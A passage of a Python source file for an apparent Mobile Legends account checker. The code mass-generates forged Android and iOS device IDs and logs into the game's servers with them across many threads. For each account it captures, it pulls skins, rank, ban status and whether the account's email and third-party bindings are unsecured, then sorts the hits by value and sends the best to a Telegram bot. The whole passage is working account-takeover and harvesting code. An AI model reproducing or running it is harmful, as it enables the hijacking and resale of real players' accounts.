            total += n
        return str((10 - (total % 10)) % 10)
    base = ''.join(random.choices('0123456789', k=14))
    return base + luhn(base)

def format_1_classic():
    return f"and_{get_oem()}{random_hex(16)}-{uuid4_str()}"

def format_2_extended_b36():
    return f"and_{get_oem()}{random_base36(random.choice([20,21,22,23,24,25]))}-{uuid4_str()}"

def format_3_android_style():
    return f"and_{random_android_id()}_{random_base36(20)}"

def format_4_gaid():
    return f"and_{random_gaid()}_{random_hex(16)}"

def format_5_ios_simple():
    return f"ios_{uuid4_upper()}"

def format_6_ios_timestamp():
    return f"ios_{uuid4_upper()}_{int(time.time() * 1_000_000)}"

def format_7_composite():
    return f"and_{get_oem()}{random_imei()}_{random_android_id()}_{random_base36(24)}"

def format_8_uuid5_style():
    ns = uuid.UUID('6ba7b810-9dad-11d1-80b4-00c04fd430c8')
    name = f"{random_hex(16)}-{random.randint(1000000, 9999999)}"
    return f"and_{str(uuid.uuid5(ns, name)).replace('-','')}_{random_base36(16)}"

FORMAT_REGISTRY = {
    "F1_CLASSIC":      {"func": format_1_classic,      "weight": 25},
    "F2_EXTENDED_B36": {"func": format_2_extended_b36, "weight": 20},
    "F3_ANDROID":      {"func": format_3_android_style,"weight": 15},
    "F4_GAID":         {"func": format_4_gaid,         "weight": 12},
    "F5_IOS":          {"func": format_5_ios_simple,   "weight": 8},
    "F6_IOS_TS":       {"func": format_6_ios_timestamp,"weight": 5},
    "F7_COMPOSITE":    {"func": format_7_composite,    "weight": 10},
    "F8_UUID5":        {"func": format_8_uuid5_style,  "weight": 5},
}

WEIGHTED_FORMAT_POOL = []
for info in FORMAT_REGISTRY.values():
    WEIGHTED_FORMAT_POOL.extend([info["func"]] * info["weight"])

FORMAT_STATS = Counter()
FORMAT_STATS_LOCK = threading.Lock()

def generate_oem_d():
    func = random.choice(WEIGHTED_FORMAT_POOL)
    dev = func()
    with FORMAT_STATS_LOCK:
        for name, info in FORMAT_REGISTRY.items():
            if info["func"] == func:
                FORMAT_STATS[name] += 1
                break
    return dev

def generate_verified_device():
    if OEM_MODE == "D":
        return generate_oem_d()
    elif OEM_MODE == "MIX_ABCD":
        r = random.random()
        if r < 0.30:   return generate_oem_d()
        elif r < 0.60: return f"and_{OEM_A}{random_hex(16)}-{uuid4_str()}"
        elif r < 0.80: return f"and_{random.choice(OEM_B_POOL)}{random_hex(16)}-{uuid4_str()}"
        else:          return f"and_{random.choice(OEM_C_POOL)}{random_hex(16)}-{uuid4_str()}"
    else:
        return f"and_{get_oem()}{random_hex(16)}-{uuid4_str()}"

def generate_worker_verified(count: int, queue: Queue):
    for _ in range(count):
        queue.put(generate_verified_device() + "\n")

def writer_thread(queue: Queue, output_file: str):
    buffer = []
    buffer_size = 0
    with open(output_file, "a", encoding="utf-8", buffering=8*1024*1024) as f:
        while True:
            item = queue.get()
            if item is None: break
            buffer.append(item)
            buffer_size += len(item)
            if buffer_size >= 8*1024*1024:
                f.write(''.join(buffer))
                buffer.clear()
                buffer_size = 0
        if buffer:
            f.write(''.join(buffer))

def run_generator(size_mb: float, threads: int = 16):
    target_lines = int((size_mb * 1024 * 1024) / AVG_BYTES_PER_LINE * 1.02)
    output_file = FILES["generated_devices"]
    if os.path.exists(output_file): os.remove(output_file)

    with FORMAT_STATS_LOCK:
        FORMAT_STATS.clear()

    queue = Queue(maxsize=100000)
    writer = threading.Thread(target=writer_thread, args=(queue, output_file))
    writer.start()

    executor = ThreadPoolExecutor(max_workers=threads)
    tasks = []
    chunk_size = 50000
    lines_left = target_lines

    while lines_left > 0:
        take = min(chunk_size, lines_left)
        tasks.append(executor.submit(generate_worker_verified, take, queue))
        lines_left -= take

    for future in tasks:
        future.result()

    queue.put(None)
    writer.join()
    executor.shutdown()

    actual_size = os.path.getsize(output_file) / (1024 * 1024)
    print(f"\n{Fore.GREEN}✓ Generated {target_lines:,} devices{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Target  : {size_mb:.2f} MB{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Actual  : {actual_size:.2f} MB{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  File    : {output_file}{Style.RESET_ALL}")

    if OEM_MODE == "D":
        print(f"\n{Fore.YELLOW}Format Distribution:{Style.RESET_ALL}")
        with FORMAT_STATS_LOCK:
            stats = dict(FORMAT_STATS)
        total = max(sum(stats.values()), 1)
        for name, count in sorted(stats.items(), key=lambda x: -x[1]):
            pct = (count / total) * 100
            bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))
            print(f"  {name:<18} {bar} {count:>8,} ({pct:5.1f}%)")

# ────────────────────────────────────────────────────────────────────
#  HIT SAVE ENGINE
# ────────────────────────────────────────────────────────────────────

def get_rank_file(rank_category: str) -> str:
    rank_files = {
        "warrior": os.path.join(OUTPUT_DIR, FOLDERS["rank_warrior"], "warrior_hits.txt"),
        "elite":   os.path.join(OUTPUT_DIR, FOLDERS["rank_elite"],   "elite_hits.txt"),
        "master":  os.path.join(OUTPUT_DIR, FOLDERS["rank_master"],  "master_hits.txt"),
        "gm":      os.path.join(OUTPUT_DIR, FOLDERS["rank_gm"],      "grandmaster_hits.txt"),
        "epic":    os.path.join(OUTPUT_DIR, FOLDERS["rank_epic"],    "epic_hits.txt"),
        "legend":  os.path.join(OUTPUT_DIR, FOLDERS["rank_legend"],  "legend_hits.txt"),
        "mythic":  os.path.join(OUTPUT_DIR, FOLDERS["rank_mythic"],  "mythic_hits.txt"),
    }
    return rank_files.get(rank_category)

def is_already_saved(device_id: str, filepath: str) -> bool:
    if not os.path.exists(filepath): return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return device_id in f.read()
    except: return False

def should_send_to_telegram(rank_category: str, skin_count: int, highest_rank: str) -> bool:
    if rank_category in ["legend", "mythic"]: return True
    if skin_count >= 100: return True
    if "Glory" in highest_rank or "Immortal" in highest_rank:
        if get_stars_from_rank(highest_rank) >= 50: return True
    return False

def format_account_card(device: str, acc: int, zone: int, pd: dict, mode: str = "ALL CHECK") -> str:
    mt       = pd.get('mt_status', 'clear').upper()
    third    = pd.get('third_party_status', 'clear').upper()
    coll     = pd.get('collector_level', 'None')
    coll_pts = pd.get('collector_points', 0)
    return "\n".join([
        "=" * 62,
        f"  {mode}  |  {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}",
        "=" * 62,
        f"  DEVICE ID    : {device}",
        f"  ACCOUNT ID   : {acc}",
        f"  ZONE ID      : {zone}",
        "-" * 62,
        f"  NICKNAME     : {pd.get('nickname', 'N/A')}",
        f"  LEVEL        : {pd.get('level', 'N/A')}",
        f"  HEROES       : {pd.get('hero_count', 0)}",
        f"  SKINS        : {pd.get('skin_count', 0)}",
        f"  COLLECTOR    : {coll} ({coll_pts:,} pts)",
        f"  RANK         : {pd.get('current_rank', 'Unranked')}",
        f"  HIGH RANK    : {pd.get('highest_rank', 'N/A')}",
        f"  V2L          : {pd.get('v2l_status', 'N/A')}",
        f"  MOONTON      : {mt}",
        f"  MT MAIL      : {pd.get('mt_mail_status', 'clear').upper()}",
        f"  3RD PARTY    : {third}",
        f"  OFFLINE      : {pd.get('offline_days', 'N/A')}",
        f"  LAST ONLINE  : {pd.get('last_online', 'N/A')}",
        f"  CREATED      : {pd.get('created_at', 'N/A')}",
        "=" * 62,
    ])

def format_f_check_card(device: str, acc: int, zone: int) -> str:
    return "\n".join([
        "=" * 62,
        f"  F CHECK HIT  |  {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}",
        "=" * 62,
        f"  DEVICE ID    : {device}",
        f"  ACCOUNT ID   : {acc}",
        f"  ZONE ID      : {zone}",
        "=" * 62,
    ])

def save_error_hit(device_id, acc, zone, reason, mode="DIRECT"):
    error_data = {
        'device': device_id, 'acc': acc, 'zone': zone,
        'reason': reason, 'mode': mode,
        'time': datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S'),
    }
    with SAVE_LOCK:
        with open(FILES["error_log"], "a", encoding='utf-8') as f:
            f.write("=" * 60 + "\n"
                    f"ERROR HIT ({mode})\n"
                    f"Device ID    : {device_id}\n"
                    f"Account      : {acc} ({zone})\n"
                    f"Reason       : {reason}\n"
                    f"Mode         : {mode}\n"
                    f"Time         : {error_data['time']}\n"
                    + "=" * 60 + "\n\n")
    with HIT_LIST_LOCK:
        HIT_LIST.append(error_data)
    with LIVE_STATS['lock']:
        LIVE_STATS['errors'] += 1
    return error_data

def save_f_check(device_id: str, account_id: int, zone_id: int):
    card = format_f_check_card(device_id, account_id, zone_id)
    with SAVE_LOCK:
        with open(FILES["f_check_hits"], "a", encoding='utf-8') as f:
            f.write(card + "\n")
    with HIT_LIST_LOCK:
        HIT_LIST.append({
            'device': device_id, 'acc': account_id, 'zone': zone_id,
            'mode': 'F_CHECK',
            'time': datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S'),
        })
    with COUNTER_LOCK:
        HIT_COUNTERS['f_check'] += 1

def save_all_check(account_info: dict, player_data: dict):
    global HIT_COUNTERS
    device = account_info.get('Device id', '')
    acc, zone = account_info.get('role_id', '?'), account_info.get('zone_id', '?')

    ban_stat = player_data.get('ban_status', 'NORMAL')
    if 'ban' in str(ban_stat).lower():
        with SAVE_LOCK:
            with open(os.path.join(OUTPUT_DIR, FOLDERS["error"], "banned_accounts.txt"), "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK: HIT_COUNTERS['banned'] += 1
        return

    nick = player_data.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", ""):
        save_error_hit(device, acc, zone, "No nickname/player info", "ALL CHECK")
        return

    skin = player_data.get('skin_count', 0)
    v2l  = player_data.get('v2l_status', 'N/A')
    v2l_text = ("ACTIVE" if str(v2l).lower() in ('enabled','yes','1','true')
                else "INACTIVE" if str(v2l).lower() in ('disabled','no','0','false')
                else "N/A")

    cur_rank = player_data.get('current_rank', 'Unranked')
    rank_category = get_rank_category(cur_rank)
    rank_folder   = get_rank_file(rank_category)
    highest_rank  = player_data.get('highest_rank', 'Unranked')

    collector_level = player_data.get('collector_level', 'None')
    collector_cat   = get_collector_category(collector_level)

    card_text = format_account_card(device, acc, zone, player_data, "ALL CHECK")

    with SAVE_LOCK:
        if not is_already_saved(device, FILES["all_check_hits"]):
            with open(FILES["all_check_hits"], "a", encoding='utf-8') as f:
                f.write(card_text + "\n")

        if rank_folder and not is_already_saved(device, rank_folder):
            with open(rank_folder, "a", encoding='utf-8') as f:
                f.write(card_text + "\n")

        if v2l_text == "ACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
        elif v2l_text == "INACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_inactive"], "v2l_inactive.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1

        if skin >= 200:
            sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
            if not is_already_saved(device, sultan_file):
                with open(sultan_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1

        if collector_cat:
            coll_file = os.path.join(OUTPUT_DIR, FOLDERS["collector"], f"{collector_cat}.txt")
            if not is_already_saved(device, coll_file):
                with open(coll_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")

    with HIT_LIST_LOCK:
        HIT_LIST.append({
            'device': device, 'acc': acc, 'zone': zone,
            'nickname': nick, 'level': player_data.get('level', 'N/A'),
            'skin': skin, 'hero': player_data.get('hero_count', 0),
            'collector': collector_level,
            'rank': cur_rank, 'max_rank': highest_rank, 'v2l': v2l_text,
            'mt': 'clear' if player_data.get('mt_status','clear')=='clear' else 'bound',
            'mt_mail': 'clear' if player_data.get('mt_mail_status','clear')=='clear' else 'bound',
            '3rd': 'clear' if player_data.get('third_party_status','clear')=='clear' else 'bound',
            'offline': player_data.get('offline_days', 'N/A'),
            'last_online': player_data.get('last_online', 'N/A'),
            'created': player_data.get('created_at', 'N/A'),
            'mode': 'ALL_CHECK',
            'time': datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S'),
        })

    if should_send_to_telegram(rank_category, skin, highest_rank):
        mt     = "CLEAR" if player_data.get('mt_status','clear')=='clear' else "BOUND"
        third  = "CLEAR" if player_data.get('third_party_status','clear')=='clear' else "BOUND"
        tg_msg = (
            f"🔥 <b>ML CHECKER - PREMIUM HIT!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <code>{device}</code>\n"
            f"🆔 <b>{acc}</b> ({zone})\n"
            f"👤 <b>{nick}</b> (Lv.{player_data.get('level', 'N/A')})\n"
            f"🏆 {cur_rank}\n"
            f"⭐ {highest_rank}\n"
            f"🦸 {player_data.get('hero_count', 0)} | 🎨 {skin}\n"
            f"📦 {collector_level}\n"
            f"🔐 V2L: {v2l_text} | 📧 Mt: {mt} | 🔗 3rd: {third}\n"
            f"⏰ Offline: {player_data.get('offline_days', 'N/A')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🤖 ML CHECKER PRO"
        )
        threading.Thread(target=send_telegram_once, args=(device, tg_msg), daemon=True).start()

    with COUNTER_LOCK:
        if rank_category in HIT_COUNTERS:
            HIT_COUNTERS[rank_category] += 1
        if collector_cat and collector_cat in HIT_COUNTERS:
            HIT_COUNTERS[collector_cat] += 1
        HIT_COUNTERS['all_check'] += 1

# ────────────────────────────────────────────────────────────────────
#  FULL INFO PULL (used by ALL CHECK)
# ────────────────────────────────────────────────────────────────────

def process_all_check(device_id: str, account_id: int, zone_id: int) -> bool:
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                with LIVE_STATS['lock']:
                    LIVE_STATS['invalid'] += 1
                return False

            game_ok = False
            for attempt in range(2):
                if not conn.get_game_server():
                    time.sleep(0.5)
                    continue
                if conn.connect_to_game_server():
                    game_ok = True
                    break
                time.sleep(0.5)

            if not game_ok:
                save_error_hit(device_id, account_id, zone_id, "Game server connect failed", "ALL CHECK")
                return False

            skin_info = conn.get_skin_role_info(account_id, zone_id)
            ban_stat  = conn.check_ban_status()
            if 'ban' in ban_stat.lower():
                with LIVE_STATS['lock']:
                    LIVE_STATS['banned'] += 1
                return False

            v2l      = get_v2l_status(conn, account_id, zone_id)
            moonton  = get_moonton_status(conn, account_id, zone_id)
            result   = conn.lookup_player(account_id)
            role_info = conn.get_role_info(account_id, zone_id)

            pd = {}
            if result and isinstance(result, dict):
                if isinstance(result.get(0), list) and result[0] and isinstance(result[0][0], dict):
                    pd = result[0][0]
                elif isinstance(result.get(0), dict):
                    pd = result[0]
                else:
                    pd = result

            skin_info  = skin_info  if isinstance(skin_info, dict)  else {}
            role_info  = role_info  if isinstance(role_info, dict)  else {}

            nick = pd.get(2) or skin_info.get(2) or role_info.get(2) or f"Player_{account_id}"
            if str(nick).lower() in ("unknown", "guest", ""):
                return False

            level     = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
            skin_cnt  = skin_info.get(10) if skin_info.get(10) is not None else pd.get(83, 0)
            hero_cnt  = skin_info.get(9)  if skin_info.get(9)  is not None else role_info.get(9, 0)
            cur_rk    = pd.get(8)  or skin_info.get(6, 0)  or role_info.get(8, 0)  or 0
            max_rk    = pd.get(95) or skin_info.get(15, 0) or role_info.get(15, 0) or 0

            last_online_ts = (pd.get(21) or pd.get(22) or pd.get(23) or
                              skin_info.get(21) or skin_info.get(22) or
                              role_info.get(21) or role_info.get(22) or 0)
            offline_info = compute_offline_info(last_online_ts)

            created_raw = pd.get(42) or conn.creation_ts
            created_at  = "N/A"
            if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                try:
                    dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                    created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                except: pass

            skin_list = skin_info.get(92, [])
            coll_pts  = 0
            if isinstance(skin_list, list):
                for s in skin_list:
                    if isinstance(s, dict):
                        q = s.get(2, 0)
                        if q in (16,17,21,22): coll_pts += 4000
                        elif q in (11,12,13,14,15): coll_pts += 3000
                        elif q in (7,8,9,10): coll_pts += 2000
                        elif q in (5,6): coll_pts += 400
                        elif q in (3,4): coll_pts += 200
                        elif q in (1,2): coll_pts += 100
                        elif q == 0: coll_pts += 40
            if coll_pts == 0:
                coll_pts = skin_cnt * 500

            collector_level = get_collector_level(coll_pts)

            player_data = {
                'nickname': nick,
                'level': level,
                'skin_count': skin_cnt,
                'hero_count': hero_cnt,
                'current_rank': map_rank(cur_rk),
                'highest_rank': map_rank(max_rk) if max_rk else map_rank(cur_rk),
                'ban_status': ban_stat,
                'v2l_status': v2l,
                'mt_status': moonton.get('mt', 'clear'),
                'mt_mail_status': moonton.get('mt_mail', 'clear'),
                'third_party_status': moonton.get('third_party', 'clear'),
                'created_at': created_at,
                'offline_days': offline_info['offline_days'],
                'last_online': offline_info['last_online'],
                'collector_level': collector_level,
                'collector_points': coll_pts,
            }

            with LIVE_STATS['lock']:
                LIVE_STATS['hits'] += 1

            save_all_check(
                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                player_data
            )
            return True
    except Exception as e:
        save_error_hit(device_id, account_id, zone_id, str(e), "ALL CHECK")
        return False

# ────────────────────────────────────────────────────────────────────
#  LIVE TERMINAL PRINTER
# ────────────────────────────────────────────────────────────────────

class LiveTerminal:
    def __init__(self):
        self.lock = threading.Lock()
        self.lines = []
        self.max_lines = 12

    def log(self, msg: str, color: str = Fore.WHITE):
        with self.lock:
            self.lines.append(f"{color}{msg}{Style.RESET_ALL}")
            if len(self.lines) > self.max_lines:
                self.lines.pop(0)

    def print_live(self):
        with self.lock:
            lines = list(self.lines)
        print("\033[F\033[K" * (self.max_lines + 1), end='')
        for line in lines:
            print(line)
        print(f"\n{Fore.LIGHTBLACK_EX}─{Style.RESET_ALL}")

live_term = LiveTerminal()

# ────────────────────────────────────────────────────────────────────
#  F CHECK
# ────────────────────────────────────────────────────────────────────

def run_f_check():
    print_header("🔥 F CHECK - LOGIN ONLY")
    print(f"{Fore.CYAN}Uses generated Device IDs to login and detect HITs{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}Source:{Style.RESET_ALL}")
    print(f"  [1] Generate new devices")
    print(f"  [2] Use existing file")
    print(f"  [0] Back\n")

    src = input(f"{Fore.CYAN}Choice (0-2): {Style.RESET_ALL}").strip()
    if src == '0': return

    devices = []
    if src == '1':
        size_mb = input(f"{Fore.CYAN}Generate size (MB, default 1): {Style.RESET_ALL}").strip()
        try:
            size_mb = float(size_mb) if size_mb else 1.0
        except:
            size_mb = 1.0
        threads = input(f"{Fore.CYAN}Threads (default 16): {Style.RESET_ALL}").strip()
        threads = int(threads) if threads.isdigit() else 16
        run_generator(size_mb, threads)
        devices = [l.strip() for l in open(FILES["generated_devices"], encoding='utf-8', errors='ignore') if l.strip()]

    elif src == '2':
        fpath = input(f"{Fore.CYAN}Enter file path: {Style.RESET_ALL}").strip()
        if not os.path.exists(fpath):
            print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
            input("Press Enter...")
            return
        devices = [l.strip() for l in open(fpath, encoding='utf-8', errors='ignore') if l.strip()]

    if not devices:
        print(f"{Fore.RED}No devices loaded!{Style.RESET_ALL}")
        input("Press Enter...")
        return

    print(f"\n{Fore.GREEN}Loaded {len(devices):,} devices{Style.RESET_ALL}")
    threads = input(f"{Fore.CYAN}Threads (default 50): {Style.RESET_ALL}").strip()
    threads = int(threads) if threads.isdigit() else 50

    start_time = time.time()
    hits = 0
    processed = 0
    lock = threading.Lock()

    def check_one(dev):
        nonlocal hits, processed
        acc, zone, stat = GameLogin(dev).run()
        with lock:
            processed += 1
        if acc and zone:
            save_f_check(dev, acc, zone)
            with lock:
                hits += 1
            live_term.log(f"[F HIT] {dev[:50]} → acc={acc} zone={zone}", Fore.GREEN)
        elif 'ban' in stat.lower():
            save_error_hit(dev, '?', '?', stat, "F_CHECK")
        else:
            live_term.log(f"[F FAIL] {dev[:50]} → {stat}", Fore.RED)
        with LIVE_STATS['lock']:
            LIVE_STATS['checked'] = processed
        live_term.log(f"Progress: {processed}/{len(devices)} | Hits: {hits}", Fore.CYAN)
        live_term.print_live()

    live_term.log(f"Starting F Check with {threads} threads...", Fore.YELLOW)
    live_term.print_live()
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(check_one, dev) for dev in devices]
        for f in futures:
            f.result()
    live_term.print_live()

    elapsed = time.time() - start_time
    print(f"\n{Fore.GREEN}✓ F CHECK Complete!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Total   : {len(devices):,}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Hits    : {hits}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Time    : {elapsed:.1f}s{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Speed   : {len(devices)/elapsed:.1f}/s{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Saved to: {FILES['f_check_hits']}{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────────
#  ALL CHECK
# ────────────────────────────────────────────────────────────────────

def run_all_check():
    print_header("🔥 ALL CHECK - FULL INFO PULL")
    print(f"{Fore.CYAN}Login + Game Server + Full Player Info{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}Source:{Style.RESET_ALL}")
    print(f"  [1] From F Check hits")
    print(f"  [2] From generated devices")
    print(f"  [3] From custom file")
    print(f"  [4] From Telegram Bot uploads")
    print(f"  [0] Back\n")

    src = input(f"{Fore.CYAN}Choice (0-4): {Style.RESET_ALL}").strip()
    if src == '0': return

    devices = []
    if src == '1':
        fpath = FILES["f_check_hits"]
        if not os.path.exists(fpath):
            print(f"{Fore.RED}No F Check hits found! Run F Check first.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        with open(fpath, encoding='utf-8', errors='ignore') as f:
            content = f.read()
        devices = re.findall(r'and_[a-zA-Z0-9_-]+|ios_[A-Z0-9_-]+', content)
        if not devices:
            print(f"{Fore.RED}No device IDs found in F Check hits!{Style.RESET_ALL}")
            input("Press Enter...")
            return

    elif src == '2':
        fpath = FILES["generated_devices"]
        if not os.path.exists(fpath):
            print(f"{Fore.RED}No generated devices! Generate first.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        devices = [l.strip() for l in open(fpath, encoding='utf-8', errors='ignore') if l.strip()]

    elif src == '3':
        fpath = input(f"{Fore.CYAN}Enter file path: {Style.RESET_ALL}").strip()
        if not os.path.exists(fpath):
            print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
            input("Press Enter...")
            return
        devices = [l.strip() for l in open(fpath, encoding='utf-8', errors='ignore') if l.strip()]

    elif src == '4':
        fpath = FILES["bot_uploads"]
        if not os.path.exists(fpath):
            print(f"{Fore.RED}No Telegram uploads yet! Send a file to the bot first.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        with open(fpath, encoding='utf-8', errors='ignore') as f:
            content = f.read()
        devices = re.findall(r'and_[a-zA-Z0-9_-]+|ios_[A-Z0-9_-]+', content)
        if not devices:
            print(f"{Fore.RED}No device IDs found in Telegram uploads!{Style.RESET_ALL}")
            input("Press Enter...")
            return

    if not devices:
        print(f"{Fore.RED}No devices loaded!{Style.RESET_ALL}")
        input("Press Enter...")
        return

    print(f"\n{Fore.GREEN}Loaded {len(devices):,} devices{Style.RESET_ALL}")
    threads = input(f"{Fore.CYAN}Threads (default 20): {Style.RESET_ALL}").strip()
    threads = int(threads) if threads.isdigit() else 20

    LIVE_STATS['start_time'] = time.time()
    with HIT_LIST_LOCK:
        HIT_LIST.clear()

    print(f"\n{Fore.CYAN}Starting ALL CHECK...{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}─" * 80 + f"{Style.RESET_ALL}")

    lock = threading.Lock()
    checked = 0

    def check_one(dev):
        nonlocal checked
        with lock:
            checked += 1
            n = checked

        acc, zone, stat = GameLogin(dev).run()

        if acc and zone:
            live_term.log(f"[ALL] {dev[:45]} → acc={acc} zone={zone} | Processing...", Fore.YELLOW)
            process_all_check(dev, acc, zone)
        else:
            with LIVE_STATS['lock']:
                LIVE_STATS['invalid'] += 1
            live_term.log(f"[ALL FAIL] {dev[:45]} → {stat}", Fore.RED)

        elapsed = time.time() - LIVE_STATS['start_time']
        speed = n / elapsed if elapsed > 0 else 0
        live_term.log(f"Checked: {n}/{len(devices)} | Hits: {LIVE_STATS['hits']} | Speed: {speed:.1f}/s", Fore.CYAN)
        live_term.print_live()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(check_one, dev) for dev in devices]
        for f in futures:
            f.result()
    live_term.print_live()

    elapsed = time.time() - LIVE_STATS['start_time']
    print(f"\n{Fore.GREEN}✓ ALL CHECK Complete!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Checked : {len(devices):,}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Hits    : {LIVE_STATS['hits']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Banned  : {LIVE_STATS['banned']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Invalid : {LIVE_STATS['invalid']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Errors  : {LIVE_STATS['errors']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Time    : {elapsed:.1f}s{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Saved to: {FILES['all_check_hits']}{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────────
#  DEVICE GENERATOR MENU
# ────────────────────────────────────────────────────────────────────

def menu_generator():
    global OEM_MODE
    while True:
        print_header("📦 DEVICE GENERATOR")
        print(f"  OEM Mode: {Fore.GREEN}{OEM_MODE}{Style.RESET_ALL}\n")
        print(f"  [1] Generate (MB)")
        print(f"  [2] Set OEM Mode (current: {OEM_MODE})")
        print(f"  [0] Back\n")
        ch = input(f"{Fore.CYAN}Choice: {Style.RESET_ALL}").strip()
        if ch == '0': return
        elif ch == '1':
            try:
                size = float(input(f"{Fore.CYAN}Size in MB (default 1): {Style.RESET_ALL}").strip() or "1")
            except: size = 1.0
            threads = input(f"{Fore.CYAN}Threads (default 16): {Style.RESET_ALL}").strip()
            threads = int(threads) if threads.isdigit() else 16
            run_generator(size, threads)
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif ch == '2':
            print(f"\n  OEM Modes: A | B | C | D | MIX | MIX_ABC | MIX_ABCD")
            mode = input(f"{Fore.CYAN}Enter mode: {Style.RESET_ALL}").strip().upper()
            if mode in ["A","B","C","D","MIX","MIX_ABC","MIX_ABCD"]:
                OEM_MODE = mode
                print(f"{Fore.GREEN}OEM Mode set to {OEM_MODE}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Invalid mode!{Style.RESET_ALL}")
            input("Press Enter...")

# ────────────────────────────────────────────────────────────────────
#  HITS BROWSER
# ────────────────────────────────────────────────────────────────────

def menu_hits_browser():
    while True:
        print_header("📊 HITS BROWSER")
        print(f"  F Check Hits  : {Fore.YELLOW}{os.path.exists(FILES['f_check_hits']) and sum(1 for _ in open(FILES['f_check_hits'])) or 0}{Style.RESET_ALL}")
        print(f"  All Check Hits: {Fore.YELLOW}{os.path.exists(FILES['all_check_hits']) and sum(1 for _ in open(FILES['all_check_hits'])) or 0}{Style.RESET_ALL}")
        print()
        print(f"  [1] View F Check Hits")
        print(f"  [2] View All Check Hits (last 20)")
        print(f"  [3] Send hits to Telegram")
        print(f"  [4] View Statistics")
        print(f"  [0] Back\n")
        ch = input(f"{Fore.CYAN}Choice: {Style.RESET_ALL}").strip()
        if ch == '0': return
        elif ch == '1':
            if not os.path.exists(FILES['f_check_hits']):
                print(f"{Fore.RED}No F Check hits yet!{Style.RESET_ALL}")
                input("Press Enter..."); continue
            with open(FILES['f_check_hits'], encoding='utf-8', errors='ignore') as f:
                content = f.read()
            print(f"\n{Fore.CYAN}── F CHECK HITS ──{Style.RESET_ALL}")
            print(content[-3000:])
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif ch == '2':
            if not os.path.exists(FILES['all_check_hits']):
                print(f"{Fore.RED}No All Check hits yet!{Style.RESET_ALL}")
                input("Press Enter..."); continue
            with open(FILES['all_check_hits'], encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            print(f"\n{Fore.CYAN}── ALL CHECK HITS (last 20) ──{Style.RESET_ALL}")
            for line in lines[-20:]:
                print(line.rstrip())
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif ch == '3':
            print(f"\n{Fore.YELLOW}Sending recent hits to Telegram...{Style.RESET_ALL}")
            sent = 0
            with open(FILES['all_check_hits'], encoding='utf-8', errors='ignore') as f:
                for line in f:
                    dev_match = re.search(r'(and_[a-zA-Z0-9_-]+|ios_[A-Z0-9_-]+)', line)
                    if dev_match and send_telegram(f"📋 <code>{line.rstrip()}</code>"):
                        sent += 1
            print(f"{Fore.GREEN}Sent {sent} hits to Telegram{Style.RESET_ALL}")
            input("Press Enter...")
        elif ch == '4':
